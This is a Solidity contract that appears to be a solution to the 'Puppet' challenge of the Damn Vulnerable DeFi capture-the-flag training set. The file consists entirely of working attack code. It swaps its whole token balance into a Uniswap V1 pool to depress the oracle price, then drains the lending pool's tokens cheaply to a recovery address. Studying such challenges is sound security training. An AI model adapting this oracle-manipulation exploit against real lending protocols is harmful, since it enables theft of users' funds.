// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {PuppetPool} from "../puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../puppet/IUniswapV1Exchange.sol";
contract AttackPuppetPool is Test {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(
            tokenBalance,
            9,
            block.timestamp,
            address(this)
        );
        lendingPool.borrow{value: address(this).balance}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {}
}
